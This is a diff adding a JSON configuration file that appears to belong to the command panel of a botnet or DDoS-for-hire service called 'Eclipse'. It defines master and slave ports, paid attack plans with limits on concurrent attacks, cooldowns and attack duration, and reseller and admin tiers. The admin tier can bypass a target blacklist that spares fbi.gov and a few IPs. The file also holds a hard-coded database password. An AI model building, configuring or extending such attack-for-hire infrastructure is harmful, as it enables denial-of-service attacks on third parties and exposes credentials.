@@ -1,0 +1,244 @@
+{
+     "Masters" : {
+          "MasterPort" : ":764",
+          "MaxAuthTries" : 3
+     },
+
+     "Slaves" : {
+          "Status" : true,
+          "Slaves" : ":195"
+     },
+
+     "SQL" : {
+          "SQL-Host" : "localhost:3306",
+          "SQL-Username" : "LicenseV2",
+          "SQL-Password" : "439083409843340984098freokgreoekrgK$D",
+          "SQL-Name" : "Yami",
+
+          "SQL-Audit" : {
+               "Status" : true,
+               "LogDetails" : "NewCredentials.tfx", 
+               "Username" : "root"
+          }
+     },
+
+     "Branding" : {
+          "AppName" : "Eclipse",
+          "MaxConcurrentsReached" : "Max Running Limit Has Been Reached",
+          "OverAllowedTime" : "Request is over your max time limit"
+     },
+
+     "DisabledCommands" : [
+          
+     ],
+
+     "Controls" : {
+          "Catpcha" : {
+               "Status" : false,
+               "Header" : "You must answer the question correctly to gain access!", 
+               "AllowedAttempts" : 4,
+               "AdminBypass" : false,
+               "Question" : {
+                    "MinGen" : 5,
+                    "MaxGen" : 15
+               }
+          },
+
+          "MFA" : {
+               "ForceMFA" : false,
+               "AdminBypassForce" : false,
+               "AppName" : "xanadu"
+          },
+
+          "Ongoing" : {
+               "ShowGlobalAttacks" : true
+          }
+     },
+
+     "Plans" : {
+          "minPassLen" : 3,
+          "MaxSessions" : 1,
+          "Presets" : [
+               {
+                    "Name" : "monthlybasic",
+                    "Description" : "Standard Plan!",
+     
+                    "Concurrents" : 1,
+                    "cooldown" : 70,
+                    "maxTime" : 400,
+     
+                    "PowerSavingExempt" : true,
+                    "PlanTimeDays" : 30,
+                    "BypassBlacklist" : false,
+                    "MaxSessions" : 3,
+                    "Reseller" : false,
+                    "VIP" : false
+               },
+               {
+                    "Name" : "weekly",
+                    "Description" : "weekly Plan!",
+     
+                    "Concurrents" : 1,
+                    "cooldown" : 70,
+                    "maxTime" : 400,
+     
+                    "PowerSavingExempt" : true,
+                    "PlanTimeDays" : 7,
+                    "BypassBlacklist" : false,
+                    "MaxSessions" : 3,
+                    "Reseller" : false,
+                    "VIP" : false
+
+
+               },
+               {
+                    "Name" : "weeklyvip",
+                    "Description" : "weeklyvip Plan!",
+     
+                    "Concurrents" : 1,
+                    "cooldown" : 40,
+                    "maxTime" : 250,
+     
+                    "PowerSavingExempt" : true,
+                    "PlanTimeDays" : 7,
+                    "BypassBlacklist" : false,
+                    "MaxSessions" : 3,
+                    "Reseller" : false,
+                    "VIP" : true
+
+
+               },
+               {
+                    "Name" : "1day",
+                    "Description" : "1day Plan!",
+     
+                    "Concurrents" : 1,
+                    "cooldown" : 300,
+                    "maxTime" : 60,
+     
+                    "PowerSavingExempt" : true,
+                    "PlanTimeDays" : 1,
+                    "BypassBlacklist" : false,
+                    "MaxSessions" : 3,
+                    "Reseller" : false,
+                    "VIP" : true
+
+
+               },
+               {
+                    "Name" : "mvip",
+                    "Description" : "Standard Plan!",
+     
+                    "Concurrents" : 1,
+                    "cooldown" : 60,
+                    "maxTime" : 500,
+     
+                    "PowerSavingExempt" : true,
+                    "PlanTimeDays" : 30,
+                    "BypassBlacklist" : false,
+                    "MaxSessions" : 3,
+                    "Reseller" : false,
+                    "VIP" : true
+               },
+               {
+                    "Name" : "3month",
+                    "Description" : "Standard Plan!",
+     
+                    "Concurrents" : 1,
+                    "cooldown" : 60,
+                    "maxTime" : 500,
+     
+                    "PowerSavingExempt" : true,
+                    "PlanTimeDays" : 90,
+                    "BypassBlacklist" : false,
+                    "MaxSessions" : 3,
+                    "Reseller" : false,
+                    "VIP" : false
+               },
+               {
+                    "Name" : "3monthvip",
+                    "Description" : "Standard Plan!",
+     
+                    "Concurrents" : 1,
+                    "cooldown" : 60,
+                    "maxTime" : 500,
+     
+                    "PowerSavingExempt" : true,
+                    "PlanTimeDays" : 90,
+                    "BypassBlacklist" : false,
+                    "MaxSessions" : 3,
+                    "Reseller" : false,
+                    "VIP" : true
+               },
+               {
+                    "Name" : "reseller",
+                    "Description" : "reseller",
+     
+                    "Concurrents" : 2,
+                    "cooldown" : 20,
+                    "maxTime" : 700,
+     
+                    "PowerSavingExempt" : true,
+                    "PlanTimeDays" : 9999,
+                    "BypassBlacklist" : false,
+                    "MaxSessions" : 2,
+                    "Reseller" : true,
+                    "VIP" : true
+               },
+               {
+                    "Name" : "lifetime",
+                    "Description" : "reseller",
+     
+                    "Concurrents" : 2,
+                    "cooldown" : 20,
+                    "maxTime" : 500,
+     
+                    "PowerSavingExempt" : true,
+                    "PlanTimeDays" : 465,
+                    "BypassBlacklist" : false,
+                    "MaxSessions" : 2,
+                    "Reseller" : false,
+                    "VIP" : false
+               },
+               {
+                    "Name" : "lifetimevip",
+                    "Description" : "reseller",
+     
+                    "Concurrents" : 2,
+                    "cooldown" : 20,
+                    "maxTime" : 800,
+     
+                    "PowerSavingExempt" : true,
+                    "PlanTimeDays" : 465,
+                    "BypassBlacklist" : false,
+                    "MaxSessions" : 2,
+                    "Reseller" : false,
+                    "VIP" : true
+               },
+               {
+                    "Name" : "admin1",
+                    "Description" : "admin",
+     
+                    "Concurrents" : 9999,
+                    "cooldown" : 0,
+                    "maxTime" : 1200000000,
+     
+                    "PowerSavingExempt" : true,
+                    "PlanTimeDays" : 9999,
+                    "BypassBlacklist" : true,
+                    "MaxSessions" : 2,
+                    "Reseller" : true,
+                    "VIP" : true
+               }
+          ]
+     },
+
+     "Attacks" : {
+          "AttackDebug" : true,
+          "Blacklists" : [
+               "fbi.gov",
+               "1.1.1.1",
+               "198.244.149.83"
+          ]
+     }
+}
